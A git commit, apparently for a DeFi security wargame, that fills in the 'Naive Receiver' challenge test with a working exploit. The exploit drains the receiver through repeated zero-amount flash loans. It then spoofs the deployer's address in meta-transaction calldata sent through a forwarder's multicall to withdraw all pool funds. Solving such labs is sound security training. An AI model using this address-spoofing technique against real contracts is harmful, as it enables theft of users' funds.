4a791acf1283ca580f8c3d572c91688458dbb420
milosdjurica <milosdjurica.work@gmail.com>
2025-05-26 16:37:25 +0200

    02-naive-receiver

--- test/naive-receiver/NaiveReceiver.t.sol
+++ test/naive-receiver/NaiveReceiver.t.sol
@@ -77,7 +77,28 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory callDatas = new bytes[](11);
+
+        for (uint256 i = 0; i < 10; ++i) {
+            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
+        }
+
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
+
+        BasicForwarder.Request memory request =
+            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), multicallData, 1 days);
+
+        bytes32 reqHash =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, reqHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        forwarder.execute(request, signature);
     }
 
     /**
